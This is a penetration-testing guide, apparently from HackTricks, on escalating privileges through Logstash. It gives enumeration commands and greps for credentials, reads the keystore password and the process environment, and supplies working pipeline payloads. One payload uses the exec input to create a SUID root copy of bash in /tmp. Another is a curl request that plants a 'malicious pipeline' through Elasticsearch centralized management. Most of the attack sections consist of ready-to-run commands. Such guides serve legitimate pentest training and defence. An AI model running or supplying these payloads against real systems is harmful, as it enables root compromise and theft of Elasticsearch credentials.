# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash is used to **gather, transform, and dispatch logs** through a system known as **pipelines**. These pipelines are made up of **input**, **filter**, and **output** stages. An interesting aspect arises when Logstash operates on a compromised machine.

### Pipeline Configuration

Pipelines are configured in the file **/etc/logstash/pipelines.yml**, which lists the locations of the pipeline configurations:

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

This file reveals where the **.conf** files, containing pipeline configurations, are located. When employing an **Elasticsearch output module**, it's common for **pipelines** to include **Elasticsearch credentials**, which often possess extensive privileges due to Logstash's need to write data to Elasticsearch. Wildcards in configuration paths allow Logstash to execute all matching pipelines in the designated directory.

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:

- A dropped file like `000-input.conf` or `zzz-output.conf` can change how the final pipeline is assembled
- A malformed file can prevent the whole pipeline from loading, so validate payloads carefully before relying on auto-reload

### Fast Enumeration on a Compromised Host

On a box where Logstash is installed, quickly inspect:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Also check whether the local monitoring API is reachable. By default it binds on **127.0.0.1:9600**, which is usually enough after landing on the host:

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:

- Possess **write access** to a pipeline **.conf** file **or**
- The **/etc/logstash/pipelines.yml** file uses a wildcard, and you can write to the target folder

Additionally, **one** of these conditions must be fulfilled:

- Capability to restart the Logstash service **or**
- The **/etc/logstash/logstash.yml** file has **config.reload.automatic: true** set

Given a wildcard in the configuration, creating a file that matches this wildcard allows for command execution. For instance:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Here, **interval** determines the execution frequency in seconds. In the given example, the **whoami** command runs every 120 seconds, with its output directed to **/tmp/output.log**.

With **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash will automatically detect and apply new or modified pipeline configurations without needing a restart. If there's no wildcard, modifications can still be made to existing configurations, but caution is advised to avoid disruptions.

### More Reliable Pipeline Payloads

The `exec` input plugin still works in current releases and requires either an `interval` or a `schedule`. It executes by **forking** the Logstash JVM, so if memory is tight your payload may fail with `ENOMEM` instead of silently running.

A more practical privilege-escalation payload is usually one that leaves a durable artifact:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

If you don't have restart rights but can signal the process, Logstash also supports a **SIGHUP**-triggered reload on Unix-like systems:

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.

### Stealing Secrets from Logstash

Before focusing only on code execution, harvest the data Logstash already has access to:

- Plaintext credentials are often hardcoded inside `elasticsearch {}` outputs, `http_poller`, JDBC inputs, or cloud-related settings
- Secure settings may live in **`/etc/logstash/logstash.keystore`** or another `path.settings` directory
- The keystore password is frequently supplied through **`LOGSTASH_KEYSTORE_PASS`**, and package-based installs commonly source it from **`/etc/sysconfig/logstash`**
- Environment-variable expansion with `${VAR}` is resolved at Logstash startup, so the service environment is worth inspecting

Useful checks:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

This is also worth checking because **CVE-2023-46672** showed that Logstash could record sensitive information in logs under specific circumstances. On a post-exploitation host, old Logstash logs and `journald` entries may therefore disclose credentials even if the current config references the keystore instead of storing secrets inline.

### Centralized Pipeline Management Abuse

In some environments, the host does **not** rely on local `.conf` files at all. If **`xpack.management.enabled: true`** is configured, Logstash can pull centrally managed pipelines from Elasticsearch/Kibana, and after enabling this mode local pipeline configs are no longer the source of truth.

That means a different attack path:

1. Recover Elastic credentials from local Logstash settings, the keystore, or logs
2. Verify whether the account has the **`manage_logstash_pipelines`** cluster privilege
3. Create or replace a centrally managed pipeline so the Logstash host executes your payload on its next poll interval

The Elasticsearch API used for this feature is:

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
  }'
```

This is especially useful when local files are read-only but Logstash is already registered to fetch pipelines remotely.

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
